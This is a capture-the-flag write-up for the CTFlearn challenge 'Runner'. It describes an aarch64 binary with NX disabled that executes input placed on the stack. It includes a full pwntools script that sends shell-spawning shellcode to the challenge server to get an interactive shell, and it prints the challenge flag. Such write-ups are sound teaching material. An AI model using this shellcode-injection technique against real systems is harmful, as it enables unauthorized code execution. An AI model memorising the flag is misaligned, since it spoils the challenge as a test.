# Runner
> Write-up author: jon-brandy
## DESCRIPTION:
I'll do whatever you give me.

nc rivit.dev 10001

## HINT:
- NONE
## STEPS:
1. Extract the .tar file shall resulting to 2 files (binary and it's source code).
2. Reviewing the source code, the vuln is very straightforward. Our input buffer directly stored onto the stack.

![image](https://github.com/Bread-Yolk/ctflearnwu/assets/70703371/cbf097cc-2bc5-4b11-a7f4-d1fd64f22547)


3. No overflow here, the chall concept must be ret2shell.
4. Checking the binary protections, shows that `NX is disabled`.

![image](https://github.com/Bread-Yolk/ctflearnwu/assets/70703371/5226deab-6e77-42b4-a35a-7c5d2bd7d716)


5. But noticed the arch is --> `aarch64-64-little`.
6. Well, since I did not have qemu yet on my machine, hence I can't debug it locally.
7. Luckily since we already knew what's the vuln, hence we can send it remotely straight away.
8. Again, need to add the `context.arch` equals to `aarch64` so pwntools know what the target arch is.

#### NOTES:

```
Run --> sudo apt install binutils-aarch64-linux-gnu

So you can use context.arch='aarch64'
```

> FULL SCRIPT

```py
from pwn import * 
import os 
os.system('clear')

exe = './task'
elf = context.binary = ELF(exe, checksec=True)
context.arch = 'aarch64'
context.log_level = 'DEBUG'

# sh = process(exe)
sh = remote('rivit.dev', 10001)
sh.sendline(asm(shellcraft.sh()))

sh.interactive()
```

> RESULT

![image](https://github.com/Bread-Yolk/ctflearnwu/assets/70703371/7daaa4ab-17fa-4928-958f-360847e20939)


9. Got the flag!

## FLAG

```
CTFlearn{n0t_s0_st4nd4rd_sh3llc0d3}
```
